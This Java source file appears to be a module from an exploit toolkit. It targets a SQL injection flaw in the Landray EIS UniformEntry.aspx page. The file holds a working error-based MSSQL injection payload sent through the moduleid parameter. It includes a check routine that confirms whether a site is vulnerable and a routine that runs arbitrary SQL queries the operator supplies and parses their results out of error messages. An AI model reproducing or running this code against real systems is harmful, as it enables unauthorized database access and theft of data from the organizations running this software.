package exp.oa.landrayoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import decrypt.code.getAllEncode;
import utils.getIndexOf;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.HashMap;

public class landray_eis_UniformEntry_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            String var1 = error_sqli(url,"ISNULL(CAST(111*111 AS NVARCHAR(4000)),CHAR(32))");
            if (var1!=null && var1.contains("12321")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ landray_eis_UniformEntry_sqli ]");
                    textArea.appendText("\n sql注入类型为报错注入(注意:执行返回不能为数字)，CMD处输入mssql语法查询");
                    textArea.appendText("\n 示例语法: user_name()");
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    public String error_sqli(String url,String sql){
        try{
            String var1 = "1 UNION ALL SELECT CHAR(24)+"+sql+"+CHAR(24),NULL-- AoEG";
            String var2 = getAllEncode.getAllUrlEncode(var1,"all");
            url = url + "/third/DingTalk/Pages/UniformEntry.aspx?moduleid="+var2;
            HttpURLConnection connection = HttpTools.getCoon(url);
            connection.setRequestMethod("GET");
            connection.setDoInput(true);
            connection.setDoOutput(true);

            int responseCode = connection.getResponseCode();

            BufferedReader reader;
            if (responseCode == HttpURLConnection.HTTP_OK) {
                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            } else {
                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
            }

            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            System.out.println("Response Code: " + responseCode);
            connection.disconnect();
            return response.toString();

        }catch(Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        String var1 = error_sqli(url,sql);
        String var0 ;
        if (var1 !=null) {
            try {
                String var2 = getIndexOf.getMessage(var1, "char 值 '", 8, "' 转换成数据类型 int 时失败", 0);
                var0 = var2;
            }catch (Exception E){
                var0 = null;
            }
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行失败");
            });
            return false;
        }

        String finalVar = var0;
        if(finalVar != null){
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行成功");
                textArea_cmd.appendText(finalVar +"\n");
                textArea.appendText("\n");
            });

            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行失败");
            });
            return false;
        }
    }
}
